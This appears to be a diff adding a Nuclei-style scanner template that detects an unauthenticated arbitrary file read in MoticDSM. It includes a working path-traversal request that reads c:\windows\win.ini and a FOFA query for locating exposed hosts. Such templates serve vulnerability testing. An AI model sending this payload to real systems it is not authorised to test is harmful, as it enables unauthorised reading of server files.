@@ -1,0 +1,48 @@
+id: motic-dsm-arbitrary-file-read
+
+info:
+  name: MoticDSM - Arbitrary File Read
+  author: s4e-io
+  severity: high
+  description: |
+    Motic Digital Slide Management System style has an arbitrary file reading vulnerability. Unauthenticated attackers can exploit this vulnerability to read important system files, leaving the website in a highly insecure state.
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/141219553
+    - https://blog.csdn.net/weixin_44337800/article/details/141328430
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: xiamen-motic
+    product: moticdsm
+    fofa-query: icon_hash="617142232"
+  tags: moticdsm,lfi,file-read
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /UploadService/Page/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"Motic")'
+          - 'status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /UploadService/Page/style?f=c:\windows\win.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"bit app support","fonts","extensions")'
+          - 'contains(content_type,"text/css")'
+          - 'status_code == 200'
+        condition: and
+# digest: 4a0a00473045022100d5db13fc45ee32d8a85d5fd28c65687b83248d27a7abc884f9adcc59adb141110220504edfdfebd5298f4321a1b0d7cbbf83c7dcc417ca1a9139e091a7c6306a0a84:922c64590222798bb761d5b6d8e72950
